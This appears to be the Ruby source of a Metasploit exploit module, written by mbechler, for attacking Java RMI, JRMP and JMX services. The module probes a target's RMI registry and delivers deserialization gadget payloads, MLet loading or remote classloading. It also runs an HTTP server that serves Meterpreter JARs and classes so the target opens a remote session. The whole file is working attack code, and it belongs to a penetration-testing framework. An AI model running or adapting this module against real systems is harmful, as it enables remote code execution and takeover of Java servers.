require_relative '../../../../lib/java/config'
require_relative '../../../../lib/java/runner'
require_relative '../../../../lib/java/gadgets'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpServer
  include Msf::Payload::UUID::Options

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Universal JRMP/RMI/JMX Exploit',
        'Description'    => '
      Module for exploiting various JRMP/RMI/JMX vulenerabilities,
      including MLet loading, deserialization attacks and remote codebase loading.
        ',
        'Author'         => ['mbechler'],
        'References'     =>
          [
          ],
        'Platform' => %w[java],
        'Arch' => [ARCH_CMD, ARCH_JAVA],
        'Targets'        =>
          [
            ['Generic', {
              'Arch' => ARCH_JAVA
            }]
          ],
        'DefaultTarget'  => 0
      )
    )

    register_options(
      [
        Opt::RHOST(),
        Opt::RPORT(1099),
        OptBool.new('SSL', [true, 'Connect using SSL', false]),
        OptBool.new('CHECK_REFS', [true, 'Check objects referenced in registry', true]),
        OptBool.new('FOLLOW_REMOTE_REFS', [true, 'Follow remote references that could point to other systems', false]),
        OptBool.new('TRY_DESER', [true, 'Try exploit deserialization', true]),
        OptBool.new('TRY_MLET', [true, 'Try exploit MLet loading', true]),
        OptBool.new('TRY_CLASSLOAD', [true, 'Try exploit remote location classloading', true]),
        OptString.new('GADGETS', [false, 'Gadgets to use in exploitation', '']),
        OptString.new('USERNAME', [false, 'JMX username']),
        OptString.new('PASSWORD', [false, 'JMX password']),

        OptInt.new('METHOD_ID', [false, 'Method ID for testing custom legacy objects', -1]),
        OptInt.new('METHOD_HASH', [false, 'Method Hash for testing custom objects']),
        OptString.new('METHOD_SIGNATURE', [false, 'Method signature for testing custom objects'])
      ]
    )
  end

  def collect
    check = Java::Runner::RMICheck.new(datastore['RHOST'],
                                       datastore['RPORT'],
                                       ssl: datastore['SSL'],
                                       username: datastore['USERNAME'],
                                       password: datastore['PASSWORD'],
                                       rc: Java::Config::PropRunConfig.new(datastore))
    check.run
  end

  def check
    vectors = collect
    unless vectors.empty?
      vectors.each do |vector|
        info vector.to_s
      end
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end

  def is_payload_compatible?(name)
    p = framework.payloads[name]
    if name == 'cmd/unix/generic' ||
       name == 'cmd/windows/generic' ||
       name == 'java/jndi' ||
       name == 'java/classfile/meterpreter/reverse_tcp'
      return true
    end

    false
  end

  def compatible_payloads
    payloads = []

    c_platform, c_arch = normalize_platform_arch

    framework.payloads.each_module do |name, mod|
      payloads << [name, mod] if is_payload_compatible?(name)
    end

    payloads
  end

  def generate_single_payload(pinst = nil, _platform = nil, _arch = nil, explicit_target = nil)
    explicit_target ||= target

    if explicit_target.nil?
      raise MissingTargetError, 'No target has been specified.',
            caller
    end

    # If a payload instance was supplied, use it, otherwise
    # use the active payload instance
    real_payload = pinst ? pinst : payload_instance

    if real_payload.nil?
      raise MissingPayloadError, 'No payload has been selected.',
            caller
    end
  end

  def exploit
    start_service

    ptype = payload_instance.fullname

    classfiles = nil
    cmd = nil
    jndiurl = nil
    if ptype == 'payload/cmd/unix/generic' ||
       ptype == 'payload/cmd/windows/generic'
      print_status('Trying command execution ' + payload.raw)
      vtypes = %w[exec bytecode classloading]
    # TODO: create adapted classfile payload
    elsif ptype == 'java/jndi'
      print_status('Trying JNDI lookup ' + payload.raw)
      jndiurl = payload.raw
      vtypes = ['jndi']
    else
      print_status('Trying bytecode execution')
      vtypes = %w[bytecode classloading]
      classfiles = payload_instance.generate_classfiles
    end

    vectors = collect
    gadgets = Java::Gadgets::BuiltinGadgets.new

    gparams = { 'classfiles' => classfiles,
                'cmd' => cmd,
                'jndiurl' => jndiurl,
                'classpath' => get_uri + '/',
                'class' => 'metasploit.LoadPayload' }

    vectors.each do |vector|
      if session_created?
        info 'Have a session, not trying further'
        break
      end
      do_exploit(vector, gadgets, gparams)
    end

    handler(nil)

    unless vectors.empty?
      begin
        print_status 'Waiting for exploit to complete...'
        Timeout.timeout(datastore['ListenerTimeout']) do
          loop do
            break if session_created?
            Rex.sleep(0.25)
          end

          print_status 'Have session...'
        end
      rescue ::Timeout::Error
        fail_with(Failure::Unknown, 'Timeout waiting for exploit to complete')
      end
    end

    stop_service
  end

  def do_exploit(vector, gadgets, params)
    if vector.id[0] == 'mlet'
      info 'Trying MLET loading'
      begin
        vector.deliver(get_uri + '/mlet')
        return
      rescue Java::JRMP::JRMPError => e
        root = Java::JRMP.unwrap_exception(e.ex)
        print_status 'MLet load returned error' + root[0][0] + ':' + root[1]['detailMessage']
      rescue Timeout::Error
        return if session_created?
        raise
      end
      return
    elsif vector.id[0] == 'classload'
      info 'Trying remote classloading'
      begin
        vector.deliver([get_uri + '/', 'metasploit.LoadPayload'])
        return
      rescue Java::JRMP::JRMPError => e
        root = Java::JRMP.unwrap_exception(e.ex)
        print_status 'Load returned error: ' + root[0][0] + ':' + root[1]['detailMessage']
      rescue Timeout::Error
        return if session_created?
        raise
      end
      return
    elsif !vector.respond_to?('context')
      info 'Unsupported vector'
      return
    end

    ctx = vector.context
    matches = gadgets.find(ctx, params: params, rc: Java::Config::PropRunConfig.new(datastore))
    matches.each do |match|
      return if session_created?
      payl = match.create(ctx, params: params)
      begin
        vector.deliver(payl)
      rescue Java::JRMP::JRMPError => e
        root = Java::JRMP.unwrap_exception(e.ex)
        type = root[0][0]
        msg = root[1].fetch('detailMessage', nil)
        if !msg.nil?
          info 'Call returned error, this does not necessarily mean that the exploit failed: ' + type + ':' + msg
        else
          info 'Call returned error, this does not necessarily mean that the exploit failed: ' + type
        end
      end
    end
  end

  def on_request_uri(cli, request)
    if request.uri =~ /mlet$/
      jarname = "#{rand_text_alpha(8 + rand(8))}.jar"

      mlet = '<HTML><mlet code="metasploit.JMXPayload" '
      mlet << "archive=\"#{jarname}\" "
      mlet << "name=\"#{@mlet}:name=jmxpayload,id=#{rand_text_alpha(8 + rand(8))}\" "
      mlet << "codebase=\"#{get_uri}\"></mlet></HTML>"
      send_response(cli, mlet,
                    'Content-Type' => 'application/octet-stream',
                    'Pragma'       => 'no-cache')

      print_status('Replied to request for mlet')
    elsif request.uri =~ /meterpreter\.jar$/
      send_response(cli, MetasploitPayloads.read('meterpreter', 'meterpreter.jar'),
                    'Content-Type' => 'application/java-archive',
                    'Pragma'       => 'no-cache')
      print_status('Replied to request for meterpreter JAR')
    elsif request.uri =~ /\.jar$/i
      jar = Rex::Zip::Jar.new
      Java::Meterpreter.meterpreter_classes(datastore, [
                                              'metasploit/JMXPayloadMBean.class',
                                              'metasploit/JMXPayload.class'
                                            ]).each do |cls|
        jar.add_file(cls[0], cls[1])
      end
      send_response(cli, jar.pack,
                    'Content-Type' => 'application/java-archive',
                    'Pragma'       => 'no-cache')
      print_status('Replied to request for payload JAR')
    elsif request.uri =~ /metasploit.dat$/
      send_response(cli, stager_config,
                    'Content-Type' => 'text/plain',
                    'Pragma' => 'no-cache')
    elsif request.uri =~ /\.class$/i
      sp = request.uri.index('/', 1)
      n = request.uri[sp + 1..-1]
      found = false
      Java::Meterpreter.meterpreter_classes(datastore, [
                                              n
                                            ]).each do |cls|
        next if cls[0] != n
        found = true
        send_response(cli, cls[1], 'Content-Type' => 'text/plain',
                                   'Pragma' => 'no-cache')
        print_status('Replied to request for class ' + request.uri)
        break
      end
      send_not_found(cli) unless found

    end
  end
end
